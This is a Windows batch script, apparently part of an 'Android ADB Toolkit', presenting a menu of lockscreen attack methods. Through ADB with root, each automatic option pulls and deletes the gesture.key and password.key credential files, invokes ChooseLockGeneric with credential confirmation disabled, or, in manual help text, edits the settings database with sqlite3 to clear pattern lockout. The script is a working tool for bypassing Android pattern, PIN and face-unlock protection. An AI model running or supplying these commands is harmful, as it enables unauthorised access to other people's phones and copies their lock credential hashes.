@echo off

title Android ADB Toolkit v%releasever%                              -[ adbtoolkit.com ]-


:reset

:: Check Root Status
if %rootstatus%==Unrooted %msgbox% %txtnoroot%


:set_var
set action=99

set gesturefile=gesture.key

set gesturepath=/data/system/gesture.key

set passwordfile=password.key

set passwordpath=/data/system/password.key

::call "scripts\get_info_bar.cmd"



:main
%showbanner%
echo.
echo.
echo Select Lockscreen Attack Method and press ENTER:
echo.
echo.
%cocolor% 0a
echo ** ALL METHODS SHOWN BELOW WILL ALSO ALLOW BYPASSING FACE UNLOCK **
%cocolor% 0e
echo.
echo.
echo 1) Super Unlock Mode (Try and Remove All Known Protections)
echo.
echo 2) Disable Pattern Unlock (Method 1 - Auto Mode)
echo.
echo 3) Disable Pattern Unlock (Method 1 - Manual Mode)
echo.
echo 4) Disable Pattern Unlock (Method 2 - Manual Mode)
echo.
echo 5) Disable Numerical Password (Method 1 - Auto Mode)
echo.
echo 6) Disable Numerical Password (Method 1 - Manual Mode)
echo.
echo 7) ChooseLockGeneric Method (Auto Mode) (4.0 - 4.3)
echo.
echo.
%cocolor% 0b
echo R) Return To Previous Menu
%cocolor% 0e
echo.

set /p action=


:: Check QUIT first so it will exit properly and be able to reject higher numbers
if %action%==R goto end
if %action%==r goto end


:: Reject any number higher than the highest menu item
if %action% gtr 7 goto reset

if %action%==1 goto opt1

if %action%==2 goto opt2

if %action%==3 goto opt3

if %action%==4 goto opt4

if %action%==5 goto opt5

if %action%==6 goto opt6

if %action%==7 goto opt7



:opt1
%showbanner%
echo.
echo.

if not exist "%dl_temp%" md "%dl_temp%"

%adb% pull %gesturepath% "%dl_temp%\%gesturefile%"
%adb% pull %passwordpath% "%dl_temp%\%passwordfile%"


%wait% 1


%adb% shell rm %gesturepath%

%adb% shell rm %passwordpath%

%adb% shell am start -n com.android.settings/com.android.settings.ChooseLockGeneric --ez confirm_credentials false --ei lockscreen.password_type 0 --activity-clear-task


%adbstart%


goto reset



:opt2
%showbanner%
echo.
echo.

if not exist "%dl_temp%" md "%dl_temp%"

%adb% pull %gesturepath% "%dl_temp%\%gesturefile%"

%wait% 1

%adb% shell rm %gesturepath%

%adbstart%

goto reset



:opt3
%showbanner%
echo.
echo.

%cocolor% 0b
echo.
echo.
echo -------------------------------------------------------------------------------
echo Android Pattern Unlock Method 1 Manual Mode Help
echo.
echo All commands are to be typed in order, one at a time, "without quotes"
echo.
echo 1) adb shell
echo.
echo 2) Check for "#" symbol for Superuser. If not shown type "su" and press ENTER
echo.
echo 3) rm %gesturepath%
echo.
echo To end your session and exit Android Shell hit CTRL+C
echo.
echo To exit CMD Prompt after exiting Shell, type "exit" to return to menu
echo.
echo If prompted "Terminate batch job", type "N" and press ENTER to return to menu
echo -------------------------------------------------------------------------------
echo.

cmd.exe -k %adb% shell


%adbstart%


goto reset




:opt4
%showbanner%

%cocolor% 0b
echo.
echo.
echo -------------------------------------------------------------------------------
echo Android Pattern Unlock Method 2 Help
echo.
echo All commands are to be typed in order, one at a time, "without quotes"
echo.
echo 1) adb shell
echo.
echo 2) Check for "#" symbol for Superuser. If not shown type "su" and press ENTER
echo.
echo 3) cd /data/data/com.android.providers.settings/databases
echo.
echo 4) sqlite3 settings.db
echo.
echo 5) update system set value=0 where name='lock_pattern_autolock';
echo.
echo 6) update system set value=0 where name='lockscreen.lockedoutpermanently';
echo.
echo 7) .quit
echo.
echo.
echo *** BE SURE TO INCLUDE THE DOT "." IN STEP 7 BEFORE QUIT ***
echo.
echo To end your session and exit Android Shell hit CTRL+C
echo.
echo To exit CMD Prompt after exiting Shell, type "exit" to return to menu
echo.
echo If prompted "Terminate batch job", type "N" and press ENTER to return to menu
echo -------------------------------------------------------------------------------
echo.

cmd.exe -k %adb% shell


%adbstart%


goto reset


:opt5
%showbanner%
echo.
echo.

if not exist "%dl_temp%" md "%dl_temp%"

%adb% pull %passwordpath% "%dl_temp%\%passwordfile%"

%wait% 1

%adb% shell rm %passwordpath%


%adbstart%


goto reset



:opt6
%showbanner%
echo.
echo.

%cocolor% 0b
echo.
echo.
echo -------------------------------------------------------------------------------
echo Disable Numerical Password Method 1 - Manual Mode Help
echo.
echo All commands are to be typed in order, one at a time, "without quotes"
echo.
echo 1) adb shell
echo.
echo 2) Check for "#" symbol for Superuser. If not shown type "su" and press ENTER
echo.
echo 3) rm %passwordpath%
echo.
echo To end your session and exit Android Shell hit CTRL+C
echo.
echo To exit CMD Prompt after exiting Shell, type "exit" to return to menu
echo.
echo If prompted "Terminate batch job", type "N" and press ENTER to return to menu
echo -------------------------------------------------------------------------------
echo.

cmd.exe -k %adb% shell

%adbstart%


goto reset


:opt7

%showbanner%
echo.
echo.

%adb% shell am start -n com.android.settings/com.android.settings.ChooseLockGeneric --ez confirm_credentials false --ei lockscreen.password_type 0 --activity-clear-task

%adbstart%

goto reset



:end


